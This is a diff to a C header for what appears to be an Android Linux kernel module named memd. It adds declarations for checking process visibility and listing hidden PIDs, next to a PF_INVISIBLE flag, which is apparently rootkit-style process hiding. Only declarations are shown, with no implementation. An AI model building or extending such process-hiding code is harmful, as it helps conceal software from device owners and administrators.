@@ -5,11 +5,15 @@
 #include <linux/mm_types.h>
 #include <linux/types.h>
 #include <linux/version.h>
+#include <linux/pid_namespace.h>
 #include "memd_common.h"
 #include <linux/sched.h>
 
 #define PF_INVISIBLE 0x10000000
 
 int is_invisible(pid_t pid);
+bool memd_hide_check_visibility(pid_t pid, struct pid_namespace *ns);
+int memd_hide_get_hidden_pids(pid_t *buf, size_t buf_size, size_t *count);
+int memd_hide_get_ns_hidden_pids(pid_t *buf, size_t buf_size, size_t *count, struct pid_namespace *ns);
 
 #endif // ANDROID_MEMD_MEMD_PROC_H
